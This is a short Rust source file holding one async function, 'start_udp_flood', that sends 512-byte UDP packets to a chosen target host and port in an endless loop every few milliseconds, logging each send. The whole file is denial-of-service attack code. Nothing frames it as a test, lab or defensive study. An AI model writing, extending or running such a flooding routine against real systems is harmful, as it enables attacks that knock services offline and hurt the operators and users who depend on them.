use std::net::UdpSocket;
use std::time::Duration;
use tokio::time::sleep;

pub async fn start_udp_flood(target: &str, port: u16) {
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    socket.set_nonblocking(true).unwrap();
    let addr = format!("{}:{}", target, port);

    loop {
        let payload = vec![0x41; 512];
        let _ = socket.send_to(&payload, &addr);
        println!("[UDP] Packet sent");
        sleep(Duration::from_millis(5)).await;
    }
}
